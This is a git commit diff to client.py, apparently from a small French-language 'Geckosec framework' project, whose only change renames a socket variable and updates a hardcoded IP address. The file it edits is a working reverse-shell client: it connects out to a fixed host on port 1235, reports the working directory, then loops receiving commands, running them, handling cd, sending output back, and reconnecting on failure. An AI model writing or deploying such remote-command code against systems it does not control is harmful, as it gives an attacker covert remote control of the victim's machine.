f0eb5f73f4c5a2f3ea95b196c91b39f3916dc082
Elieroc <34548349+Elieroc@users.noreply.github.com>
2021-02-09 11:53:26 +0100

    Update client.py

--- client.py
+++ client.py
@@ -15,30 +15,27 @@ import time
 
 def main():
 
-    global socket
+    global sock
 
-    # Pour régler le soucis, essayer de changer la variable socket par sock
-    #socket = 0
-
-    host, port = ('192.168.1.100', 1235)
-    socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    host, port = ('192.168.43.90', 1235)
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
     try:
-        socket.connect((host, port))
+        sock.connect((host, port))
         print(" /!\ Client connecté /!\ \n")
 
         # On envoie le path
         path = os.getcwd().encode("utf8")
-        socket.send(path)
+        sock.send(path)
 
         while True:
-            command = socket.recv(9999)
+            command = sock.recv(9999)
             command = command.decode("utf8")
 
             if command == "exit":
                 print("Merci d'avoir utilisé Geckosec framework !")
                 time.sleep(0.5)
-                socket.close()
+                sock.close()
 
             if command[:2] == "cd":
                 try :
@@ -46,11 +43,11 @@ def main():
                     os.chdir(new_dir)
 
                     result = os.getcwd()
-                    socket.send(result.encode())
+                    sock.send(result.encode())
                 except:
                     # On envoie le path où est l'utilisateur (car le new est innaccessible)
                     result = os.getcwd()
-                    socket.send(result.encode())
+                    sock.send(result.encode())
             else:
 
                 print("> " + command)
@@ -59,15 +56,15 @@ def main():
                 # Parfois la commande ne retourne rien et donc génère une erreur d'où l'utilité de ce if
                 if result.decode("utf-8", errors="ignore") == "":
                     result = " "
-                    socket.send(result.encode())
+                    sock.send(result.encode())
                 else:
                     #print(result.decode("utf-8", errors="ignore"))
-                    socket.send(result)
+                    sock.send(result)
     except:
         print('\n /!\ Connexion au serveur échouée /!\ \n')
         time.sleep(5)
         main()
     finally:
-        socket.close()
+        sock.close()
 
 #main()
